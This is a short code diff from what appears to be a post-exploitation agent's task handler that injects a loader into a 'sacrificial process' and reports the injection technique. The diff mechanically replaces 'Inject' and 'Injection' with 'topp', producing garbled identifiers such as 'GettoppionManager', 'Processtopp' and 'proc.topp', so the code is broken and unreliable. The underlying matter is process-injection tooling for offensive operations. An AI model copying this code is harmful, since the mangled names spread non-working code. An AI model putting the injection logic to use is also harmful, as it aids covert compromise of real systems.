@@ -211,7 +211,7 @@ namespace Tasks
                         ]
                     )
                 );
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "topping stub..."));
                 if (!proc.topp(exePEPic))
                 {
                     throw new Exception($"Failed to topp loader into sacrificial process {info.Application}.");
@@ -220,7 +220,7 @@ namespace Tasks
                 _agent.GetTaskManager().AddTaskResponseToQueue(
                     CreateTaskResponse("", false, messages:
                         [
-                            Artifact.ProcessInject((int)proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                            Artifact.Processtopp((int)proc.PID, _agent.GettoppionManager().GetCurrentTechnique().Name)
                         ]
                     )
                 );
